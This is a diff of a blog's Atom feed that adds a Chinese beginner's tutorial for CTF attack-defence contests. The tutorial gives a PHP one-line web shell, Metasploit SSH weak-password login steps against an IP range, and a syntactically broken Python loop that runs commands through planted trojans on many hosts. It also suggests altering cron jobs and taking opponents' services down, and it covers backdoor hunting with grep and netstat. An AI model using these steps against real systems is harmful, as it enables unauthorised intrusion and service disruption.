@@ -6,7 +6,7 @@
   <link href="https://hexo.tangxs0808.ltd/atom.xml" rel="self"/>
   
   <link href="https://hexo.tangxs0808.ltd/"/>
-  <updated>2020-12-25T03:43:43.448Z</updated>
+  <updated>2020-12-25T08:42:31.143Z</updated>
   <id>https://hexo.tangxs0808.ltd/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CTF初赛新手教程</title>
+    <link href="https://hexo.tangxs0808.ltd/2020/12/25/CTF%E5%88%9D%E8%B5%9B%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B/"/>
+    <id>https://hexo.tangxs0808.ltd/2020/12/25/CTF%E5%88%9D%E8%B5%9B%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B/</id>
+    <published>2020-12-25T08:15:57.000Z</published>
+    <updated>2020-12-25T08:42:31.143Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/css/APlayer.min.css"><script src="/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/js/Meting.min.js"></script><p>本文只针对新手熟悉比赛思路，大佬绕路！</p><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><h2 id="登陆服务器"><a href="#登陆服务器" class="headerlink" title="登陆服务器"></a>登陆服务器</h2><p>第一点我们登上服务器后肯定就是看弱口令，看有几个可以登陆的bash普通用户。</p><p>   查看 cat /etc/passwd 看有几个bash账号（都修改好密码）<br>   查看80 服务网页</p><h2 id="登陆数据库-账号在配置文件里-var-www-html-include"><a href="#登陆数据库-账号在配置文件里-var-www-html-include" class="headerlink" title="登陆数据库 (账号在配置文件里 /var/www/html/include/)"></a>登陆数据库 (账号在配置文件里 /var/www/html/include/)</h2><p>此处如果对手未改密码基本上也和你的web服务密码一致</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -u name -p</span><br><span class="line">Show databases (查看数据库)</span><br><span class="line">Use 库名 （设置查看的库）</span><br><span class="line">show tables (查看表)</span><br><span class="line">select * from 表名 （查看所有内容）</span><br></pre></td></tr></table></figure><p>可以查看到网页的账户密码<br>看网页是否有上传文件漏洞<br>查看哪里可以上传文件，试试一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if md5($_GET[&quot;a&quot;]&#x3D;&quot;md5值&quot;) &#x2F;&#x2F;此处可以删减</span><br><span class="line">system(&quot;cat &#x2F;root&#x2F;flag*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="此处针对对手未改bash账户弱口令的攻击"><a href="#此处针对对手未改bash账户弱口令的攻击" class="headerlink" title="此处针对对手未改bash账户弱口令的攻击"></a>此处针对对手未改bash账户弱口令的攻击</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole //扫描弱口令</span><br><span class="line">search ssh_login</span><br><span class="line">use auxiliary/scanner/ssh_login</span><br><span class="line">info</span><br><span class="line">Set (设置) username （admin） //和自己的本地的账户类似</span><br><span class="line">Set password 123456 //(和自己的弱口令一样）针对未修改密码的</span><br><span class="line"><span class="built_in">set</span> RhOSTS ip地址段 *.*.*.1-2 //第四位不一样</span><br><span class="line">exploit //探测</span><br><span class="line">sessions //列出</span><br><span class="line">sessions -i 1 //连接目标的ssh</span><br><span class="line">cat /flag* </span><br></pre></td></tr></table></figure><p>当然进去系统后能干什么，就看自己的了。<br>这里列出几种：<br>查看定时任务，改更定时任务内容<br>是否可以本地提权<br>关闭对方的80端口或者让对方直接宿机，直接出局。</p><h3 id="找后门"><a href="#找后门" class="headerlink" title="找后门"></a>找后门</h3><h2 id="Web方面："><a href="#Web方面：" class="headerlink" title="Web方面："></a>Web方面：</h2><pre><code>     找到web程序的目录 （短文件的一般可能是后门）     cd /var/www/html/     ls -a      grep &quot;eval&quot; -R ./* (搜索当前目录下所有文件，带关键词）</code></pre><h2 id="例如找到系统中有一句话木马"><a href="#例如找到系统中有一句话木马" class="headerlink" title="例如找到系统中有一句话木马"></a>例如找到系统中有一句话木马</h2><p>那么我们可以写个简单的python批量获取flag的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Import requests //导入模块</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i<span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">110</span>,<span class="number">122</span>):</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0.0.0.&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;/木马文件?[token]=system(&#x27;cat /root/flag* &#x27;);&quot;</span> //定义一个url</span><br><span class="line">    <span class="keyword">try</span>:  //抓取异常</span><br><span class="line">req = requests.get(url) (get方式传输的) </span><br><span class="line">Print <span class="string">&quot;0.0.0.&#x27;+str(i)+&#x27;,req.text     </span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">pass</span></span><br></pre></td></tr></table></figure><h2 id="系统方面："><a href="#系统方面：" class="headerlink" title="系统方面："></a>系统方面：</h2><pre><code>    netstat -ntl (tcp)（查看系统端口号，哪些与外部链接的，127.0.0.1的本地接口可以不考虑，一般没有后门，）    netstat -nul (udp) (68端口是dhcp，）</code></pre><p>做出对应的调整</p><h2 id="注意漏洞的种类"><a href="#注意漏洞的种类" class="headerlink" title="注意漏洞的种类"></a>注意漏洞的种类</h2><p>基本漏洞<br>命令注入的漏洞<br>文件上传漏洞<br>文件包含漏洞<br>远程代码执行的漏洞<br>缓冲区溢出漏洞<br>系统后门</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/js/APlayer.min.js&quot; class=&quot;aplayer-se</summary>
+      
+    
+    
+    
+    <category term="技术教程" scheme="https://hexo.tangxs0808.ltd/categories/%E6%8A%80%E6%9C%AF%E6%95%99%E7%A8%8B/"/>
+    
+    
+    <category term="CTF" scheme="https://hexo.tangxs0808.ltd/tags/CTF/"/>
+    
+    <category term="加固" scheme="https://hexo.tangxs0808.ltd/tags/%E5%8A%A0%E5%9B%BA/"/>
+    
+    <category term="攻击" scheme="https://hexo.tangxs0808.ltd/tags/%E6%94%BB%E5%87%BB/"/>
+    
+  </entry>
   
   <entry>
     <title>CloudFlare-Workers项目整理</title>
